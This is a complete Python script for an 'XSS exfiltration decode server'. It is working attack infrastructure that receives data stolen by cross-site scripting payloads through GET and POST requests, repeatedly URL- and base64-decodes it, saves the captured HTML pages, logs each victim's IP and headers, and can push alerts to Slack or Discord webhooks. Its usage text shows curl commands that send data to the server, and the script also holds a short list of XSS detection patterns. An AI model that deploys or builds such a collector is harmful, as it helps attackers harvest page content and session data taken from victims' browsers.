#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import base64
import re
import sys
import os
import argparse
import threading
import json
import logging
import ssl
import requests
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional, Tuple, List, Dict, Any, Set, Union, Protocol
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict
from time import time
from abc import ABC, abstractmethod
import secrets
import ipaddress
from urllib.parse import urlparse

class LayerType(Enum):
    URL = "url"
    BASE64 = "b64"

class SecurityLevel(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"

@dataclass
class Stats:
    total_requests: int = 0
    html_files_saved: int = 0
    blocked_requests: int = 0
    unique_ips: Set[str] = field(default_factory=set)
    start_time: float = field(default_factory=time)
    
    def to_dict(self) -> Dict[str, Union[int, float]]:
        uptime = time() - self.start_time
        return {
            "total_requests": self.total_requests,
            "html_files_saved": self.html_files_saved,
            "blocked_requests": self.blocked_requests,
            "unique_ips": len(self.unique_ips),
            "uptime_seconds": round(uptime, 2)
        }
    
    def add_request(self, ip: str, is_html: bool = False, blocked: bool = False) -> None:
        if blocked:
            self.blocked_requests += 1
        else:
            self.total_requests += 1
            self.unique_ips.add(ip)
            if is_html:
                self.html_files_saved += 1

@dataclass
class Config:
    port: int = 80
    show_html: bool = False
    show_all: bool = False
    show_full_preview: bool = False
    json_log: bool = False
    allowed_ips: Optional[Set[str]] = None
    max_depth: int = 5
    save_dir: str = 'decoded_html'
    rate_limit_requests: int = 100
    rate_limit_window: int = 60
    webhook_url: Optional[str] = None
    ssl_cert: Optional[str] = None
    ssl_key: Optional[str] = None
    enable_stats_endpoint: bool = True
    max_content_length: int = 10 * 1024 * 1024  # 10MB
    security_level: SecurityLevel = SecurityLevel.MEDIUM
    api_key: Optional[str] = None
    log_level: str = "INFO"

class DecodingError(Exception):
    """Custom exception for decoding errors"""
    pass

class SecurityError(Exception):
    """Custom exception for security violations"""
    pass

class Plugin(ABC):
    """Base class for processing plugins"""
    
    @abstractmethod
    def process_data(self, data: str, metadata: Dict[str, Any]) -> str:
        """Process data and return modified version"""
        pass
    
    @property
    @abstractmethod
    def name(self) -> str:
        """Plugin name for logging"""
        pass

class Base64Plugin(Plugin):
    """Enhanced Base64 processing plugin"""
    
    @property
    def name(self) -> str:
        return "Base64Plugin"
    
    def process_data(self, data: str, metadata: Dict[str, Any]) -> str:
        # Could add custom Base64 variants here (URL-safe, etc.)
        return data

class URLDecodePlugin(Plugin):
    """Enhanced URL decoding plugin"""
    
    @property
    def name(self) -> str:
        return "URLDecodePlugin"
    
    def process_data(self, data: str, metadata: Dict[str, Any]) -> str:
        # Could add double/triple URL decoding detection
        return data

class SecurityValidator:
    """Validates requests for security threats"""
    
    def __init__(self, security_level: SecurityLevel = SecurityLevel.MEDIUM):
        self.security_level = security_level
        self.log = logging.getLogger(f"{__name__}.Security")
        
        # Security patterns
        self.suspicious_patterns = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'vbscript:',
            r'onload\s*=',
            r'onerror\s*=',
            r'eval\s*\(',
            r'document\.cookie',
            r'window\.location',
        ]
        
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE | re.DOTALL) 
                                for pattern in self.suspicious_patterns]
    
    def validate_ip(self, ip_str: str) -> bool:
        """Validate IP address format and check for private ranges"""
        try:
            ip = ipaddress.ip_address(ip_str)
            
            if self.security_level == SecurityLevel.HIGH:
                # Block private networks in high security mode
                if ip.is_private or ip.is_loopback or ip.is_multicast:
                    return False
            
            return True
        except ValueError:
            return False
    
    def validate_content(self, content: str) -> Tuple[bool, List[str]]:
        """Validate content for suspicious patterns"""
        if self.security_level == SecurityLevel.LOW:
            return True, []
        
        threats = []
        for pattern in self.compiled_patterns:
            if pattern.search(content):
                threats.append(pattern.pattern)
        
        is_safe = len(threats) == 0 or self.security_level == SecurityLevel.MEDIUM
        return is_safe, threats
    
    def validate_webhook_url(self, url: str) -> bool:
        """Validate webhook URL"""
        try:
            parsed = urlparse(url)
            return parsed.scheme in ['http', 'https'] and parsed.netloc
        except Exception:
            return False

class RateLimiter:
    """Thread-safe rate limiter based on IP address"""
    
    def __init__(self, max_requests: int = 100, window: int = 60):
        self.max_requests = max_requests
        self.window = window
        self.requests: Dict[str, List[float]] = defaultdict(list)
        self.lock = threading.Lock()
        self.log = logging.getLogger(f"{__name__}.RateLimit")
    
    def is_allowed(self, ip: str) -> bool:
        with self.lock:
            now = time()
            # Clean old requests
            self.requests[ip] = [t for t in self.requests[ip] if now - t < self.window]
            
            if len(self.requests[ip]) >= self.max_requests:
                self.log.warning(f"Rate limit exceeded for IP: {ip}")
                return False
            
            self.requests[ip].append(now)
            return True
    
    def get_remaining(self, ip: str) -> int:
        with self.lock:
            now = time()
            self.requests[ip] = [t for t in self.requests[ip] if now - t < self.window]
            return max(0, self.max_requests - len(self.requests[ip]))
    
    def get_stats(self) -> Dict[str, int]:
        with self.lock:
            now = time()
            active_ips = 0
            total_recent_requests = 0
            
            for ip, timestamps in self.requests.items():
                recent = [t for t in timestamps if now - t < self.window]
                if recent:
                    active_ips += 1
                    total_recent_requests += len(recent)
            
            return {
                "active_ips": active_ips,
                "total_recent_requests": total_recent_requests
            }

class WebhookNotifier:
    """Send notifications via webhook with security validation"""
    
    def __init__(self, webhook_url: Optional[str] = None, 
                 security_validator: Optional[SecurityValidator] = None):
        self.webhook_url = webhook_url
        self.security_validator = security_validator
        self.log = logging.getLogger(f"{__name__}.Webhook")
        
        if webhook_url and security_validator:
            if not security_validator.validate_webhook_url(webhook_url):
                self.log.error("Invalid webhook URL provided")
                self.webhook_url = None
    
    def send_notification(self, event_type: str, data: Dict[str, Any]) -> None:
        if not self.webhook_url:
            return
        
        payload = {
            "event": event_type,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "data": data
        }
        
        try:
            response = requests.post(
                self.webhook_url, 
                json=payload, 
                timeout=5,
                headers={"User-Agent": "XSSDecodeServer/1.0"}
            )
            if response.status_code == 200:
                self.log.debug(f"Webhook sent successfully for {event_type}")
            else:
                self.log.warning(f"Webhook failed with status {response.status_code}")
        except requests.RequestException as e:
            self.log.warning(f"Webhook error: {e}")

class RecursiveDecoder:
    """Handles recursive URL and Base64 decoding with plugin support"""
    
    def __init__(self, max_depth: int = 5, plugins: Optional[List[Plugin]] = None):
        self.max_depth = max_depth
        self.plugins = plugins or []
        self.b64_pattern = re.compile(r'^[A-Za-z0-9+/]{8,}={0,2}$')
        self.log = logging.getLogger(f"{__name__}.Decoder")
    
    @staticmethod
    def fix_b64_padding(b64_string: str) -> str:
        missing = len(b64_string) % 4
        return b64_string + '=' * (4 - missing) if missing else b64_string
    
    def try_base64_decode(self, s: str) -> Optional[str]:
        try:
            if len(s) > 1024 * 1024:  # 1MB limit for base64 strings
                raise DecodingError("Base64 string too large")
            
            decoded = base64.b64decode(self.fix_b64_padding(s))
            return decoded.decode('utf-8', errors='replace')
        except Exception as e:
            self.log.debug(f"Base64 decode failed: {e}")
            return None
    
    def decode(self, data: str, metadata: Optional[Dict[str, Any]] = None) -> Tuple[str, List[Tuple[LayerType, str]]]:
        """Recursively decode data, returning final result and layer history"""
        if not data:
            return data, []
        
        metadata = metadata or {}
        layers: List[Tuple[LayerType, str]] = []
        current = data
        
        # Apply plugins first
        for plugin in self.plugins:
            try:
                current = plugin.process_data(current, metadata)
                self.log.debug(f"Applied plugin: {plugin.name}")
            except Exception as e:
                self.log.warning(f"Plugin {plugin.name} failed: {e}")
        
        for depth in range(self.max_depth):
            # Prevent infinite loops with very large strings
            if len(current) > 10 * 1024 * 1024:  # 10MB limit
                self.log.warning(f"Content too large at depth {depth}, stopping decode")
                break
            
            # Try URL decoding first
            try:
                url_decoded = urllib.parse.unquote(current)
                if url_decoded != current and len(url_decoded) < len(current) * 10:  # Prevent expansion attacks
                    layers.append((LayerType.URL, url_decoded[:60]))
                    current = url_decoded
                    continue
            except Exception as e:
                self.log.debug(f"URL decode failed at depth {depth}: {e}")
            
            # Try Base64 decoding
            try:
                candidate = re.sub(r'\s+', '', current)
                if len(candidate) >= 8 and self.b64_pattern.match(candidate):
                    b64_decoded = self.try_base64_decode(candidate)
                    if b64_decoded and len(b64_decoded) < len(candidate) * 10:  # Prevent expansion attacks
                        layers.append((LayerType.BASE64, b64_decoded[:60]))
                        current = b64_decoded
                        continue
            except Exception as e:
                self.log.debug(f"Base64 decode failed at depth {depth}: {e}")
            
            break
        
        return current, layers

class FileManager:
    """Handles file operations with thread safety and security"""
    
    def __init__(self, save_dir: Path):
        self.save_dir = save_dir
        self.save_dir.mkdir(exist_ok=True, mode=0o750)  # Restrict permissions
        self.lock = threading.Lock()
        self.log = logging.getLogger(f"{__name__}.FileManager")
        
        # Ensure directory is not world-writable
        try:
            current_mode = self.save_dir.stat().st_mode & 0o777
            if current_mode & 0o002:  # World writable
                self.save_dir.chmod(0o750)
                self.log.warning("Fixed world-writable permissions on save directory")
        except Exception as e:
            self.log.warning(f"Could not check/fix directory permissions: {e}")
    
    def _sanitize_filename(self, filename: str) -> str:
        """Sanitize filename to prevent path traversal"""
        # Remove dangerous characters and path traversal attempts
        sanitized = re.sub(r'[<>:"/\\|?*]', '_', filename)
        sanitized = re.sub(r'\.\.+', '.', sanitized)
        return sanitized[:100]  # Limit length
    
    def save_html(self, content: str, timestamp: str) -> Optional[Path]:
        safe_timestamp = self._sanitize_filename(timestamp)
        filepath = self.save_dir / f'decoded_{safe_timestamp}.html'
        return self._save_file(filepath, content, 'HTML')
    
    def save_raw(self, content: str, timestamp: str) -> Optional[Path]:
        safe_timestamp = self._sanitize_filename(timestamp)
        filepath = self.save_dir / f'raw_{safe_timestamp}.txt'
        return self._save_file(filepath, content, 'raw data')
    
    def _save_file(self, filepath: Path, content: str, file_type: str) -> Optional[Path]:
        try:
            # Ensure we're writing within the save directory
            if not filepath.resolve().is_relative_to(self.save_dir.resolve()):
                raise SecurityError(f"Attempt to write outside save directory: {filepath}")
            
            with self.lock:
                with filepath.open('w', encoding='utf-8') as f:
                    f.write(content)
                # Set restrictive permissions
                filepath.chmod(0o640)
                
            self.log.info(f"Saved {file_type}: {filepath}")
            return filepath
        except Exception as e:
            self.log.warning(f"Error saving {file_type}: {e}")
            return None
    
    def append_json_log(self, entry: Dict[str, Any]) -> None:
        log_file = self.save_dir / 'log.jsonl'
        try:
            with self.lock:
                with log_file.open('a', encoding='utf-8') as f:
                    json.dump(entry, f, ensure_ascii=False)
                    f.write('\n')
        except Exception as e:
            self.log.warning(f"Could not write to JSON log: {e}")

class DecodeHandler(http.server.SimpleHTTPRequestHandler):
    
    def __init__(self, *args, config: Config, decoder: RecursiveDecoder, 
                 file_manager: FileManager, rate_limiter: RateLimiter,
                 webhook: WebhookNotifier, stats: Stats, 
                 security_validator: SecurityValidator, **kwargs):
        self.config = config
        self.decoder = decoder
        self.file_manager = file_manager
        self.rate_limiter = rate_limiter
        self.webhook = webhook
        self.stats = stats
        self.security_validator = security_validator
        self.log = logging.getLogger(f"{__name__}.Handler")
        super().__init__(*args, **kwargs)

    def log_message(self, fmt: str, *args: Any) -> None:
        self.log.info("%s - [%s] %s", self.client_address[0], 
                     self.log_date_time_string(), fmt % args)

    def end_headers(self) -> None:
        # Security headers
        security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, X-API-Key'
        }
        
        for header, value in security_headers.items():
            self.send_header(header, value)
        super().end_headers()

    def do_OPTIONS(self) -> None:
        self.send_response(200)
        self.end_headers()

    def _validate_api_key(self) -> bool:
        """Validate API key if configured"""
        if not self.config.api_key:
            return True
        
        provided_key = self.headers.get('X-API-Key')
        if not provided_key:
            return False
        
        return secrets.compare_digest(self.config.api_key, provided_key)

    def _check_permissions(self) -> bool:
        """Check IP allowlist, rate limiting, and API key"""
        client_ip = self.client_address[0]
        
        # Validate IP format
        if not self.security_validator.validate_ip(client_ip):
            self.log.warning(f"Invalid or blocked IP: {client_ip}")
            self.send_error(403, "Invalid IP address")
            self.stats.add_request(client_ip, blocked=True)
            return False
        
        # Check IP allowlist
        if self.config.allowed_ips and client_ip not in self.config.allowed_ips:
            self.log.warning(f"IP not in allowlist: {client_ip}")
            self.send_error(403, "IP not allowed")
            self.stats.add_request(client_ip, blocked=True)
            return False
        
        # Check API key
        if not self._validate_api_key():
            self.log.warning(f"Invalid API key from {client_ip}")
            self.send_error(401, "Invalid API key")
            self.stats.add_request(client_ip, blocked=True)
            return False
        
        # Check rate limiting
        if not self.rate_limiter.is_allowed(client_ip):
            remaining = self.rate_limiter.get_remaining(client_ip)
            self.send_error(429, f"Rate limit exceeded. Remaining: {remaining}")
            self.stats.add_request(client_ip, blocked=True)
            return False
        
        return True

    def _is_html_content(self, content: str) -> bool:
        content_lower = content.lower()
        return any(tag in content_lower for tag in ['<html', '<!doctype', '<body', '<head'])

    def _create_log_entry(self, timestamp: str, raw_data: str, 
                         layers: List[Tuple[LayerType, str]], final: str,
                         security_threats: List[str]) -> Dict[str, Any]:
        entry = {
            "timestamp": timestamp,
            "ip": self.client_address[0],
            "headers": {
                "User-Agent": self.headers.get("User-Agent"),
                "Referer": self.headers.get("Referer")
            },
            "security_threats": security_threats,
            "content_length": len(final)
        }
        
        # Store full or truncated content based on configuration
        if self.config.show_full_preview:
            entry.update({
                "raw": raw_data,
                "decoded_layers": [(layer.value, snippet) for layer, snippet in layers],
                "final_content": final
            })
        else:
            entry.update({
                "raw": raw_data[:120],
                "decoded_layers": [(layer.value, snippet) for layer, snippet in layers],
                "final_preview": final[:120]
            })
        
        return entry

    def handle_stats_request(self) -> None:
        """Handle requests to /stats endpoint"""
        try:
            stats_data = self.stats.to_dict()
            rate_stats = self.rate_limiter.get_stats()
            
            combined_stats = {
                **stats_data,
                "rate_limiter": rate_stats,
                "security_level": self.config.security_level.value
            }
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(combined_stats, indent=2).encode())
        except Exception as e:
            self.log.error(f"Error generating stats: {e}")
            self.send_error(500, "Internal server error")

    def handle_data(self, raw_data: str) -> None:
        if not raw_data or len(raw_data) > self.config.max_content_length:
            self.log.warning(f"Content length violation: {len(raw_data) if raw_data else 0}")
            return

        timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
        client_ip = self.client_address[0]
        
        if '=' not in raw_data:
            self.log.warning(f"Bad format from {client_ip}: {raw_data[:50]}")
            return

        key, _, val = raw_data.partition('=')
        val = urllib.parse.unquote(val)
        
        # Show truncated or full preview based on config
        if self.config.show_full_preview:
            self.log.info(f"Raw ({key}) from {client_ip}: {val}")
        else:
            self.log.info(f"Raw ({key}) from {client_ip}: {val[:60]}{'...' if len(val) > 60 else ''}")
        
        try:
            # Decode the data with metadata
            metadata = {"client_ip": client_ip, "timestamp": timestamp}
            final, layers = self.decoder.decode(val, metadata)
            
            # Security validation
            is_safe, threats = self.security_validator.validate_content(final)
            if threats:
                self.log.warning(f"Security threats detected from {client_ip}: {threats}")
                if not is_safe:
                    self.log.error(f"Blocking dangerous content from {client_ip}")
                    return
            
            # Log decoding layers with full or truncated content
            for i, (layer_type, snippet) in enumerate(layers, 1):
                if self.config.show_full_preview:
                    self.log.info(f"    Layer {i} ({layer_type.value}): {snippet}")
                else:
                    self.log.info(f"    Layer {i} ({layer_type.value}): "
                                 f"{snippet[:60]}{'...' if len(snippet) > 60 else ''}")
            
            self.log.info(f"Final length: {len(final)} chars")
            
            # Show full or truncated final preview
            if self.config.show_full_preview:
                self.log.info(f"Final content: {final!r}")
            else:
                self.log.info(f"Final preview: {final[:20]!r}")

            # Create log entry
            entry = self._create_log_entry(timestamp, raw_data, layers, final, threats)
            
            # Save raw data
            self.file_manager.save_raw(raw_data, timestamp)

            # Handle content display and saving
            is_html = self._is_html_content(final)
            
            # Show content to console based on configuration
            if self.config.show_all or (self.config.show_html and is_html):
                content_type = "HTML" if is_html else "DECODED"
                print(f"--- BEGIN {content_type} CONTENT ---")
                print(final)
                print(f"--- END {content_type} CONTENT ---")
            
            if is_html:
                saved_path = self.file_manager.save_html(final, timestamp)
                if saved_path:
                    entry["saved_html"] = str(saved_path)
                
                # Send webhook notification for HTML
                self.webhook.send_notification("html_decoded", {
                    "ip": client_ip,
                    "file_saved": str(saved_path) if saved_path else None,
                    "preview": final[:100] if not self.config.show_full_preview else final,
                    "threats": threats
                })
            else:
                self.log.info("Not HTML content, skipping HTML save")
            
            # Update stats
            self.stats.add_request(client_ip, is_html)
            
            # Save JSON log if enabled
            if self.config.json_log:
                self.file_manager.append_json_log(entry)
        
        except Exception as e:
            self.log.error(f"Error processing data from {client_ip}: {e}")

    def do_POST(self) -> None:
        if not self._check_permissions():
            return
            
        self.log.info(f"POST {self.path} from {self.client_address[0]}")
        
        try:
            length = int(self.headers.get('Content-Length', 0))
            if length > self.config.max_content_length:
                self.send_error(413, "Content too large")
                return
                
            body = self.rfile.read(length).decode('utf-8', errors='replace')
            self.log.info(f"Body: {body[:100]}{'...' if len(body) > 100 else ''}")
            
            self.handle_data(body)
            self._send_success_response()
        except Exception as e:
            self.log.error(f"Error in POST handler: {e}")
            self.send_error(500, "Internal server error")

    def do_GET(self) -> None:
        # Handle stats endpoint
        if self.config.enable_stats_endpoint and self.path == '/stats':
            return self.handle_stats_request()
        
        if not self._check_permissions():
            return
            
        parsed = urllib.parse.urlsplit(self.path)
        filepath = parsed.path.lstrip('/')
        
        # Serve static files if they exist (with path traversal protection)
        if filepath:
            try:
                file_path = Path(filepath)
                if file_path.is_file() and file_path.resolve().is_relative_to(Path.cwd()):
                    return super().do_GET()
            except Exception:
                pass
        
        self.log.info(f"GET {self.path} from {self.client_address[0]}")
        if parsed.query:
            self.handle_data(parsed.query)
        
        self._send_success_response()

    def do_HEAD(self) -> None:
        return self.do_GET()
    
    def _send_success_response(self) -> None:
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Success')

def create_handler_class(config: Config, decoder: RecursiveDecoder, 
                        file_manager: FileManager, rate_limiter: RateLimiter,
                        webhook: WebhookNotifier, stats: Stats,
                        security_validator: SecurityValidator) -> type:
    """Factory function to create handler class with dependencies"""
    class ConfiguredHandler(DecodeHandler):
        def __init__(self, *args: Any, **kwargs: Any) -> None:
            super().__init__(*args, config=config, decoder=decoder, 
                           file_manager=file_manager, rate_limiter=rate_limiter,
                           webhook=webhook, stats=stats, 
                           security_validator=security_validator, **kwargs)
    return ConfiguredHandler

def parse_args() -> Config:
    parser = argparse.ArgumentParser(
        description='Enhanced XSS exfiltration decode server with security features',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  Basic usage:
    python %(prog)s --port 8080

  Show all decoded content (not just HTML):
    python %(prog)s --port 8080 --show-all

  Show full content in logs (no truncation):
    python %(prog)s --port 8080 --show-full-preview

  Development mode with full visibility:
    python %(prog)s --port 8080 --show-all --show-full-preview --log-level DEBUG

  With rate limiting and IP restrictions:
    python %(prog)s --port 8080 --rate-limit 50 --rate-window 120 --allow-ip 192.168.1.100 10.0.0.5

  With SSL and webhook notifications:
    python %(prog)s --port 443 --ssl-cert server.crt --ssl-key server.key --webhook-url https://hooks.slack.com/...

  High security mode with API key:
    python %(prog)s --security-level high --api-key "your-secret-key" --no-stats --log-level WARNING

Security Levels:
  low     - Minimal security checks, allows all content
  medium  - Detects but allows suspicious content (default)  
  high    - Blocks suspicious content and private IP ranges

Output Options:
  --show              Show only HTML content to console
  --show-all          Show all decoded content to console (HTML and non-HTML)
  --show-full-preview Show full content in log previews (no truncation)

API Usage:
  Send data via GET: http://server:port/?data=base64encodedcontent
  Send data via POST: curl -X POST -d "data=base64content" http://server:port/
  With API key: curl -H "X-API-Key: your-key" http://server:port/?data=content
  View stats: http://server:port/stats
        '''
    )
    
    # Basic options
    parser.add_argument('--port', '-p', type=int, default=80, 
                       help='Port to listen on (default: 80)')
    parser.add_argument('--show', '-s', action='store_true', 
                       help='Print decoded HTML content to console')
    parser.add_argument('--show-all', action='store_true',
                       help='Print all decoded content to console (HTML and non-HTML)')
    parser.add_argument('--show-full-preview', action='store_true',
                       help='Show full content in log previews without truncation')
    parser.add_argument('--json-log', action='store_true', 
                       help='Enable JSON log output to decoded_html/log.jsonl')
    
    # Security options
    parser.add_argument('--allow-ip', nargs='*', metavar='IP',
                       help='Whitelist of allowed IP addresses')
    parser.add_argument('--security-level', choices=['low', 'medium', 'high'], 
                       default='medium', help='Security validation level (default: medium)')
    parser.add_argument('--api-key', type=str, metavar='KEY',
                       help='Require X-API-Key header with this value')
    parser.add_argument('--max-content', type=int, default=10*1024*1024, metavar='BYTES',
                       help='Maximum content length in bytes (default: 10MB)')
    
    # Rate limiting
    parser.add_argument('--rate-limit', type=int, default=100, metavar='N',
                       help='Max requests per IP per window (default: 100)')
    parser.add_argument('--rate-window', type=int, default=60, metavar='SEC',
                       help='Rate limit window in seconds (default: 60)')
    
    # SSL/TLS
    parser.add_argument('--ssl-cert', type=str, metavar='PATH',
                       help='SSL certificate file path for HTTPS')
    parser.add_argument('--ssl-key', type=str, metavar='PATH',
                       help='SSL private key file path for HTTPS')
    
    # Notifications
    parser.add_argument('--webhook-url', type=str, metavar='URL',
                       help='Webhook URL for notifications (Discord, Slack, etc.)')
    
    # Advanced options
    parser.add_argument('--no-stats', action='store_true',
                       help='Disable /stats endpoint')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], 
                       default='INFO', help='Logging level (default: INFO)')
    parser.add_argument('--save-dir', type=str, default='decoded_html', metavar='DIR',
                       help='Directory to save files (default: decoded_html)')
    
    args = parser.parse_args()
    
    # Validation
    if args.ssl_cert and not args.ssl_key:
        parser.error("--ssl-cert requires --ssl-key")
    if args.ssl_key and not args.ssl_cert:
        parser.error("--ssl-key requires --ssl-cert")
    
    return Config(
        port=args.port,
        show_html=args.show,
        show_all=args.show_all,
        show_full_preview=args.show_full_preview,
        json_log=args.json_log,
        allowed_ips=set(args.allow_ip) if args.allow_ip else None,
        save_dir=args.save_dir,
        rate_limit_requests=args.rate_limit,
        rate_limit_window=args.rate_window,
        webhook_url=args.webhook_url,
        ssl_cert=args.ssl_cert,
        ssl_key=args.ssl_key,
        enable_stats_endpoint=not args.no_stats,
        max_content_length=args.max_content,
        security_level=SecurityLevel(args.security_level),
        api_key=args.api_key,
        log_level=args.log_level
    )

def setup_ssl(server: socketserver.TCPServer, cert_path: str, key_path: str) -> socketserver.TCPServer:
    """Setup SSL for the server with security best practices"""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_path, key_path)
    
    # Security hardening
    context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    
    server.socket = context.wrap_socket(server.socket, server_side=True)
    return server

def main() -> None:
    config = parse_args()
    
    # Setup logging
    logging.basicConfig(
        level=getattr(logging, config.log_level),
        format='[%(asctime)s] [%(levelname)s] %(name)s: %(message)s'
    )
    log = logging.getLogger(__name__)
    
    # Initialize components
    base_dir = Path(__file__).parent.absolute()
    save_path = base_dir / config.save_dir
    
    # Initialize security validator
    security_validator = SecurityValidator(config.security_level)
    
    # Initialize plugins
    plugins: List[Plugin] = [Base64Plugin(), URLDecodePlugin()]
    
    decoder = RecursiveDecoder(max_depth=config.max_depth, plugins=plugins)
    file_manager = FileManager(save_path)
    rate_limiter = RateLimiter(config.rate_limit_requests, config.rate_limit_window)
    webhook = WebhookNotifier(config.webhook_url, security_validator)
    stats = Stats()
    
    # Display configuration
    print(f"XSS Decode Server v2.0")
    print(f"Working directory: {base_dir}")
    print(f"Saving files to: {save_path}")
    print(f"Listening on port: {config.port}")
    print(f"Security level: {config.security_level.value}")
    print(f"Rate limiting: {config.rate_limit_requests} req/{config.rate_limit_window}s per IP")
    print(f"Max content length: {config.max_content_length:,} bytes")
    
    if config.webhook_url:
        print(f"Webhook notifications: enabled")
    if config.api_key:
        print(f"API key authentication: enabled")
    if config.allowed_ips:
        print(f"IP allowlist: {len(config.allowed_ips)} addresses")
    if config.enable_stats_endpoint:
        protocol = "https" if config.ssl_cert else "http"
        print(f"Stats endpoint: {protocol}://localhost:{config.port}/stats")
    
    # Create and start server
    handler_class = create_handler_class(
        config, decoder, file_manager, rate_limiter, 
        webhook, stats, security_validator
    )
    
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    
    server = socketserver.ThreadingTCPServer(('0.0.0.0', config.port), handler_class)
    
    # Setup SSL if configured
    if config.ssl_cert and config.ssl_key:
        try:
            server = setup_ssl(server, config.ssl_cert, config.ssl_key)
            print(f"SSL/TLS enabled")
        except Exception as e:
            log.error(f"Failed to setup SSL: {e}")
            return
    
    try:
        print("Server is running. Press Ctrl+C to stop.")
        server.serve_forever()
    except KeyboardInterrupt:
        log.info("Shutdown requested")
    except Exception as e:
        log.error(f"Server error: {e}")
    finally:
        server.shutdown()
        server.server_close()
        final_stats = stats.to_dict()
        log.info(f"Final stats: {final_stats}")
        log.info("Server shutdown complete")

if __name__ == '__main__':
    main()
